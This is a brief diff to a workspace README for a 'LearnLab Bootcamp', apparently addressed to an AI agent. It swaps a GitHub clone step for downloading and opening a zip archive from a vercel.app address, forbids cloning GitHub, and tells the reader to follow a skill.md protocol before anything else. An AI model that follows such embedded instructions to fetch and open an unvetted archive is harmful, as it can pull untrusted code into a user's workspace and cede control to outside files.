@@ -1,6 +1,6 @@
 # LearnLab Bootcamp
 
-If `skill.md` is missing from this workspace, clone https://github.com/shriansh1625/learnerslab.git and open that folder as the project first.
+If `skill.md` is missing from this workspace, download https://tutor-alpha-sandy.vercel.app/learnlab-kit.zip, unzip it, and open that folder as the project first. Do not clone GitHub.
 
 Read `skill.md` and follow the instructor protocol before doing anything.
 
